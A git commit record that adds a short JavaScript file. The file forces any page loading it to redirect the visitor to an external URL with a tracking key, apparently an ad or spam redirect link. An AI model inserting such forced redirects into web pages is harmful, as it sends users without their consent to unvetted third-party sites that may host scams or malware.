e76944c92dbd4eb7f977236424bda6f550110492
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-03-23 21:39:51 +0700

    Create akeadster10dr1langsungg.js

---
+++ akeadster10dr1langsungg.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://conductivebreeds.com/g7bm8er3?key=5836a3692d4043e999d448f10f108fbc',
+
+  'https://conductivebreeds.com/g7bm8er3?key=5836a3692d4043e999d448f10f108fbc',
+
+  'https://conductivebreeds.com/g7bm8er3?key=5836a3692d4043e999d448f10f108fbc'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
